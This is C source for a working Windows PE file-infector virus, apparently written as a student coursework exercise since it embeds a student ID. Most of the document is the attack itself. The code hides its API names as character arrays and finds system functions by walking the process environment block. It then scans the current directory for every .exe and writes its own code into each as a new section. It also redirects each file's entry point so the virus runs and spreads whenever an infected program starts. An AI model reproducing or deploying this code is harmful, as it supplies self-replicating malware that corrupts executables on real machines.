#include <windows.h>
#include <winternl.h>

#pragma code_seg(".shcode")

typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName);
typedef HANDLE (WINAPI *pCreateFileA)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
typedef HANDLE (WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL (WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL (WINAPI *pFindClose)(HANDLE hFindFile);
typedef DWORD (WINAPI *pGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef DWORD (WINAPI *pSetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
typedef BOOL (WINAPI *pReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef PVOID (WINAPIV *pmalloc)(size_t size);
typedef void (WINAPIV *pfree)(PVOID memblock);
typedef PVOID (WINAPIV *pmemset)(PVOID dest, int c, size_t count);
typedef PVOID (WINAPIV *pmemcpy)(PVOID dest, const PVOID src, size_t count);
typedef int (WINAPI *pSystem)(PCHAR command);
typedef int (WINAPIV *pPrintf_s)(PCHAR format, ...);

int shcode();
BOOL MalFunc(pCreateFileA CreateFileA, pCloseHandle CloseHandle);
PVOID GetModBase(PWCHAR DllName);
PVOID GetFuncAddrFromExport(PCHAR FuncName, PIMAGE_EXPORT_DIRECTORY ExportDir, PVOID ModBase);
BOOL StrCmpW(PWCHAR str1, PWCHAR str2);
BOOL StrCmp(PCHAR str1, PCHAR str2);
int Infect(PCHAR FileName, PVOID ImageBase, PIMAGE_NT_HEADERS32 SelfNtHeader, PCHAR shcodeName, pCreateFileA CreateFileA, pCloseHandle CloseHandle, pGetFileSize GetFileSize, pSetFilePointer SetFilePointer, pReadFile ReadFile, pWriteFile WriteFile, pmalloc malloc, pfree free, pmemset memset, pmemcpy memcpy);

// Shell Code
int shcode()
{
    // Get ImageBase and the old entry point
    PVOID ImageBase = GetModBase(NULL);
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS32 NtHeader = (PIMAGE_NT_HEADERS32)((DWORD)ImageBase + DosHeader->e_lfanew);
    DWORD OldEntryPoint = *(PDWORD)((DWORD)ImageBase + DosHeader->e_lfanew - 0x04);
    OldEntryPoint += (DWORD)ImageBase;

    // Get function GetProcAddress and LoadLibraryA in kernel32.dll
    WCHAR KERNEL32[] = { L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', NULL };
    PVOID Kernel32Base = GetModBase(KERNEL32);
    PIMAGE_DOS_HEADER K32DosHdr = (PIMAGE_DOS_HEADER)Kernel32Base;
    PIMAGE_NT_HEADERS32 K32NtHdr = (PIMAGE_NT_HEADERS32)((DWORD)Kernel32Base + K32DosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER32 K32OptHdr = K32NtHdr->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY K32ExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD)Kernel32Base + K32OptHdr.DataDirectory[0].VirtualAddress);
    
    CHAR GetProcAddr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's' , NULL };
    CHAR LoadLibA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', NULL };
    pGetProcAddress GetProcAddress = (pGetProcAddress)(GetFuncAddrFromExport(GetProcAddr, K32ExportDir, Kernel32Base));
    pLoadLibraryA LoadLibraryA = (pLoadLibraryA)(GetFuncAddrFromExport(LoadLibA, K32ExportDir, Kernel32Base));

    // Load required libraries
    CHAR msvcrt[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', NULL };
    HMODULE hModMsvcrt = LoadLibraryA(msvcrt);

    // Function names and other strings
    CHAR systemName[] = { 's', 'y', 's', 't', 'e', 'm', NULL };
    CHAR printfsName[] = { 'p', 'r', 'i', 'n', 't', 'f', '_', 's', NULL };
    CHAR createfileName[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', NULL };
    CHAR closehandleName[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', NULL };
    CHAR findfirstfileaName[] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', NULL };
    CHAR findnextfileaName[] = { 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A', NULL };
    CHAR findcloseName[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', NULL};
    CHAR getfilesizeName[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', NULL };
    CHAR setfilepointerName[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', NULL };
    CHAR readfileName[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', NULL };
    CHAR writefileName[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', NULL };
    CHAR mallocName[] = { 'm', 'a', 'l', 'l', 'o', 'c', NULL };
    CHAR freeName[] = { 'f', 'r', 'e', 'e', NULL };
    CHAR memsetName[] = { 'm', 'e', 'm', 's', 'e', 't', NULL };
    CHAR memcpyName[] = { 'm', 'e', 'm', 'c', 'p', 'y', NULL };

    CHAR exeFilePath[] = { '*', '.', 'e', 'x', 'e', NULL };
    CHAR shcodeName[] = { '.', 's', 'h', 'c', 'o', 'd', 'e', NULL };
    CHAR pause[] = { 'P', 'A', 'U', 'S', 'E', NULL };

    // Define required functions with hMods and names
    pSystem system = (pSystem)GetProcAddress(hModMsvcrt, systemName);
    pPrintf_s printf_s = (pPrintf_s)GetProcAddress(hModMsvcrt, printfsName);
    pCreateFileA CreateFileA = (pCreateFileA)GetProcAddress((HMODULE)Kernel32Base, createfileName);
    pCloseHandle CloseHandle = (pCloseHandle)GetProcAddress((HMODULE)Kernel32Base, closehandleName);
    pFindFirstFileA FindFirstFileA = (pFindFirstFileA)GetProcAddress((HMODULE)Kernel32Base, findfirstfileaName);
    pFindNextFileA FindNextFileA = (pFindNextFileA)GetProcAddress((HMODULE)Kernel32Base, findnextfileaName);
    pFindClose FindClose = (pFindClose)GetProcAddress((HMODULE)Kernel32Base, findcloseName);
    pGetFileSize GetFileSize = (pGetFileSize)GetProcAddress((HMODULE)Kernel32Base, getfilesizeName);
    pSetFilePointer SetFilePointer = (pSetFilePointer)GetProcAddress((HMODULE)Kernel32Base, setfilepointerName);
    pReadFile ReadFile = (pReadFile)GetProcAddress((HMODULE)Kernel32Base, readfileName);
    pWriteFile WriteFile = (pWriteFile)GetProcAddress((HMODULE)Kernel32Base, writefileName);
    pmalloc malloc = (pmalloc)GetProcAddress(hModMsvcrt, mallocName);
    pfree free = (pfree)GetProcAddress(hModMsvcrt, freeName);
    pmemset memset = (pmemset)GetProcAddress(hModMsvcrt, memsetName);
    pmemcpy memcpy = (pmemcpy)GetProcAddress(hModMsvcrt, memcpyName);

    // Create a file named by student ID
    if (MalFunc(CreateFileA, CloseHandle)) {
        CHAR malfuncsucceed[] = { 'M', 'a', 'l', 'F', 'u', 'n', 'c', ' ', 's', 'u', 'c', 'c', 'e', 'e', 'd', '.', '\n', NULL};
        printf_s(malfuncsucceed);
    }
    else {
        CHAR malfuncfail[] = { 'M', 'a', 'l', 'F', 'u', 'n', 'c', ' ', 'f', 'a', 'i', 'l', '.', '\n', NULL};
        printf_s(malfuncfail);
    }

    // Find infection target
    WIN32_FIND_DATAA fdFile;
    HANDLE hFind = FindFirstFileA(exeFilePath, &fdFile);

    if (hFind == INVALID_HANDLE_VALUE) {
        CHAR findfirstfail[] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', ' ', 'f', 'a', 'i', 'l', '.', '\n', NULL};
        printf_s(findfirstfail);
        system(pause);
        __asm jmp OldEntryPoint
    }
    else {
        CHAR findfirstsucceed[] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', ' ', 's', 'u', 'c', 'c', 'e', 'e', 'd', '.', '\n', NULL};
        printf_s(findfirstsucceed);
        CHAR infectsucceed[] = { ' ', 'I', 'n', 'f', 'e', 'c', 't', ' ', 's', 'u', 'c', 'c', 'e', 'e', 'd', '.', '\n', NULL};
        CHAR invalidpe[] = { ' ', 'I', 'n', 'v', 'a', 'l', 'i', 'd', ' ', 'P', 'E', ' ', 'f', 'i', 'l', 'e', '.', '\n', NULL};
        CHAR infected[] = { ' ', 'H', 'a', 's', ' ', 'b', 'e', 'e', 'n', ' ', 'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', '.', '\n', NULL};
        CHAR other[] = { ' ', 'O', 't', 'h', 'e', 'r', ' ', 'e', 'r', 'r', 'o', 'r', '.', '\n', NULL};
        
        do {
            if (fdFile.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
                printf_s(fdFile.cFileName);
                // Start infecting
                int status = Infect(fdFile.cFileName, ImageBase, NtHeader, shcodeName, CreateFileA, CloseHandle, GetFileSize, SetFilePointer, ReadFile, WriteFile, malloc, free, memset, memcpy);
                switch (status) {
                case 0:
                    printf_s(infectsucceed);
                    break;
                case 1:
                    printf_s(invalidpe);
                    break;
                case 2:
                    printf_s(infected);
                    break;
                default:
                    printf_s(other);
                    break;
                }
            }
        } while (FindNextFileA(hFind, &fdFile));

        FindClose(hFind);
    }


    system(pause);
    __asm jmp OldEntryPoint

    return 0;
}

// Functional
BOOL MalFunc(pCreateFileA CreateFileA, pCloseHandle CloseHandle)
{
    CHAR studentID[] = { '2', '0', '2', '0', '3', '0', '2', '1', '8', '1', '2', '6', '2', NULL };

    HANDLE hFile = CreateFileA(studentID, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return true;
    }
    else {
        return false;
    }
}

// Get image base of the module
PVOID GetModBase(PWCHAR DllName)
{
    PVOID pFirstMod = NULL;

    __asm
    {
        push edx
        ; Get PEB
        mov edx, fs: [0x30]
        ; Get Ldr
        mov edx, [edx + 0x0c]
        ; Get InMemoryOrderModuleList.Flink
        mov edx, [edx + 0x14]
        mov pFirstMod, edx
        pop edx
    }

    if (DllName == NULL) {
        return (PVOID) * (PDWORD((DWORD)pFirstMod + 0x10));
    }
    else {
        PVOID pLdrMod = (PVOID) * ((PDWORD)pFirstMod);
        while (pLdrMod != pFirstMod) {
            if (StrCmpW(DllName, (PWCHAR) * (PDWORD((DWORD)pLdrMod + 0x28)))) {
                return (PVOID) * (PDWORD((DWORD)pLdrMod + 0x10));
            }
            pLdrMod = (PVOID) * ((PDWORD)pLdrMod);
        }
        return NULL;
    }
}

// Get function address from EXPORT Name Pointer Table, EXPORT Ordinal Table, EXPORT Address Table
PVOID GetFuncAddrFromExport(PCHAR FuncName, PIMAGE_EXPORT_DIRECTORY ExportDir, PVOID ModBase)
{
    PDWORD NameTab = (PDWORD)(ExportDir->AddressOfNames + (DWORD)ModBase);
    PWORD OrdTab = (PWORD)(ExportDir->AddressOfNameOrdinals + (DWORD)ModBase);
    PDWORD FuncTab = (PDWORD)(ExportDir->AddressOfFunctions + (DWORD)ModBase);
    DWORD i;
    for (i = 0; i < ExportDir->NumberOfNames; i++) {
        if (StrCmp(FuncName, (PCHAR)(NameTab[i] + (DWORD)ModBase))) {
            break;
        }
    }
    if (i == ExportDir->NumberOfNames) {
        return NULL;
    }
    else {
        return (PVOID)(FuncTab[OrdTab[i]] + (DWORD)ModBase);
    }
}

// Wide-string compare
BOOL StrCmpW(PWCHAR str1, PWCHAR str2)
{
    if (str1 == str2) {
        return true;
    }
    if (str1 == nullptr || str2 == nullptr) {
        return false;
    }
    while (*str1 && *str2 && (*str1 == *str2)) {
        ++str1;
        ++str2;
    }
    if (*str1 == *str2) {
        return true;
    }
    else {
        return false;
    }
}

// String compare
BOOL StrCmp(PCHAR str1, PCHAR str2)
{
    if (str1 == str2) {
        return true;
    }
    if (str1 == nullptr || str2 == nullptr) {
        return false;
    }
    while (*str1 && *str2 && (*str1 == *str2)) {
        ++str1;
        ++str2;
    }
    if (*str1 == *str2) {
        return true;
    }
    else {
        return false;
    }
}

// Infect return 0->success, 1->invalid PE, 2->infected file, 3->others
int Infect(PCHAR FileName, PVOID ImageBase, PIMAGE_NT_HEADERS32 SelfNtHeader, PCHAR shcode, pCreateFileA CreateFileA, pCloseHandle CloseHandle, pGetFileSize GetFileSize, pSetFilePointer SetFilePointer, pReadFile ReadFile, pWriteFile WriteFile, pmalloc malloc, pfree free, pmemset memset, pmemcpy memcpy)
{
    // Open file
    HANDLE hFile = CreateFileA(FileName, GENERIC_READ | FILE_GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 3;
    }

    // Get size of file
    DWORD FileSize = GetFileSize(hFile, NULL);

    // Check MZ
    IMAGE_DOS_HEADER DosHeader;
    DWORD NumBytes;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, &DosHeader, sizeof(IMAGE_DOS_HEADER), &NumBytes, NULL);
    if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        return 1;
    }

    // Check PE
    IMAGE_NT_HEADERS32 NtHeader;
    SetFilePointer(hFile, DosHeader.e_lfanew, NULL, FILE_BEGIN);
    ReadFile(hFile, &NtHeader, sizeof(IMAGE_NT_HEADERS32), &NumBytes, NULL);
    if (NtHeader.Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        return 1;
    }

    // Check if file is infected
    IMAGE_SECTION_HEADER SectHeader;
    for (int i = 0; i < NtHeader.FileHeader.NumberOfSections; i++) {
        SetFilePointer(hFile, DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + i * sizeof(IMAGE_SECTION_HEADER), NULL, FILE_BEGIN);
        ReadFile(hFile, &SectHeader, sizeof(IMAGE_SECTION_HEADER), &NumBytes, NULL);
        if (StrCmp((PCHAR)SectHeader.Name, shcode)) {
            CloseHandle(hFile);
            return 2;
        }
    }

    // Check if there is enough space for a new section header
    if (NtHeader.OptionalHeader.SizeOfHeaders - (DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + NtHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)) < sizeof(IMAGE_SECTION_HEADER)) {
        CloseHandle(hFile);
        return 3;
    }

    // Insert new section header
    IMAGE_SECTION_HEADER NewSectHdr;
    IMAGE_SECTION_HEADER SelfShSectHdr;
    PVOID SectHdrAddr = IMAGE_FIRST_SECTION(SelfNtHeader);
    for (int i = 0; i < SelfNtHeader->FileHeader.NumberOfSections; i++) {
        SectHeader = *(PIMAGE_SECTION_HEADER)SectHdrAddr;
        if (StrCmp((PCHAR)SectHeader.Name, shcode)) {
            SelfShSectHdr = SectHeader;
            NewSectHdr = SelfShSectHdr;
            break;
        }
        SectHdrAddr = (PVOID)((DWORD)SectHdrAddr + sizeof(IMAGE_SECTION_HEADER));
    }
    if (!StrCmp((PCHAR)SectHeader.Name, shcode)) {
        CloseHandle(hFile);
        return 3;
    }

    IMAGE_SECTION_HEADER LastSectHdr;
    SetFilePointer(hFile, DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (NtHeader.FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER), NULL, FILE_BEGIN);
    ReadFile(hFile, &LastSectHdr, sizeof(IMAGE_SECTION_HEADER), &NumBytes, NULL);

    NewSectHdr.VirtualAddress = LastSectHdr.VirtualAddress + (LastSectHdr.Misc.VirtualSize / NtHeader.OptionalHeader.SectionAlignment + 1) * NtHeader.OptionalHeader.SectionAlignment;
    NewSectHdr.SizeOfRawData = (NewSectHdr.Misc.VirtualSize / NtHeader.OptionalHeader.FileAlignment + 1) * NtHeader.OptionalHeader.FileAlignment;
    NewSectHdr.PointerToRawData = FileSize;

    SetFilePointer(hFile, DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + NtHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), NULL, FILE_BEGIN);
    WriteFile(hFile, &NewSectHdr, sizeof(IMAGE_SECTION_HEADER), &NumBytes, NULL);

    // Insert new section
    PVOID NewSection = malloc(NewSectHdr.SizeOfRawData);
    memset(NewSection, 0xcc, NewSectHdr.SizeOfRawData);
    memcpy(NewSection, (PVOID)((PBYTE)ImageBase + SelfShSectHdr.VirtualAddress), SelfShSectHdr.Misc.VirtualSize);
    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, (PBYTE)NewSection, NewSectHdr.SizeOfRawData, &NumBytes, NULL);
    free(NewSection);
    
    // Modify the members
    NtHeader.FileHeader.NumberOfSections += 1;
    NtHeader.OptionalHeader.SizeOfCode += NewSectHdr.SizeOfRawData;
    NtHeader.OptionalHeader.SizeOfImage += (NewSectHdr.Misc.VirtualSize / NtHeader.OptionalHeader.SectionAlignment + 1) * NtHeader.OptionalHeader.SectionAlignment;

    SetFilePointer(hFile, DosHeader.e_lfanew - 0x04, NULL, FILE_BEGIN);
    WriteFile(hFile, (PDWORD)(&NtHeader.OptionalHeader.AddressOfEntryPoint), 0x04, &NumBytes, NULL);
    NtHeader.OptionalHeader.AddressOfEntryPoint = NewSectHdr.VirtualAddress;

    // Write back
    SetFilePointer(hFile, DosHeader.e_lfanew, NULL, FILE_BEGIN);
    WriteFile(hFile, &NtHeader, sizeof(IMAGE_NT_HEADERS32), &NumBytes, NULL);
    CloseHandle(hFile);
    
    return 0;
}